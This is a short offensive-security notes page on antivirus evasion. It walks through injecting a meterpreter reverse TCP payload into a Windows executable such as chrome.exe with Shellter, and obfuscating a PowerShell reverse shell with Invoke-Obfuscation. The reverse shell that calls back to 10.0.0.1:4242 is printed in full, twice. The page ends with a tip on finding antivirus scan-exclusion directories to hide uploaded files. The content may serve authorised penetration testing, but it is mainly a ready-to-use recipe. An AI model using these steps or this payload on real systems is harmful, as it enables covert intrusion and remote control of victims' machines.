---
title: "AV Evasion"
weight: 3
---

# AV Evasion


## AV evasion with shellter

* Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit. Shellter takes advantage of the original structure of the PE file and doesn’t apply any modification such as changing memory access permissions in sections (unless the user wants to), adding an extra section with RWE access, and whatever would look dodgy under an AV scan.
* Install (https://www.kali.org/tools/shellter/)
* How to use (example)
  * Start shellter
  * Choose operation mode: `A` (automatic)
  * PE target: `/path/to/file/chrome.exe`
  * Enable stealth mode? `Y` (in this way the executable works as intended)
  * Select the payload you want (you can also generate a new one)
    * For this example we select a listed payload (meterpreter reverce tcp)
  * Set lhost and lport
  * Now the exe will be overwrite (but shellter creates a backup of the original exe)
  * Set listener (ex. multi/handler), download the exe on the target machine and execute

---

## AV evasion for powershell script - Invoke-Obfuscation

* https://github.com/danielbohannon/Invoke-Obfuscation
* Require powershell (`sudo apt install powershell -y`). You can run powershell with `pwsh`
* cd into invoke-obfuscation folder
* `Import-Module ./Invoke-Obfuscation.psd1`
* `Invoke-Obfuscation`
* Copy a reverse shell in poweshell (example): `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
* Remove `powershell -nop -c` and `" "`
* `$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
* Set lhost and lport and save (example) as `shell.ps1`
* On Invoke-Obfuscation `SET SCRIPTPATH /path/to/shell.ps1`
* Set `AST` options (The AST options works better with windows 10...
* Choose one of the AST module: `ALL`
* Choose one of the AST\ALL options to apply to current payload: `1`
* In the result you will get the result obfuscated code. Copy and save the code
* Set listener (ex. multi/handler), download the exe on the target machine and execute

---

## Tips

* See the process of antivirus with `ps auxww`.  Sometimes you can see that the antivirus exclude some directory ...&#x20;
  * `clamscan -r --exclude-dir=/test /` . Upload the file in `/test`.
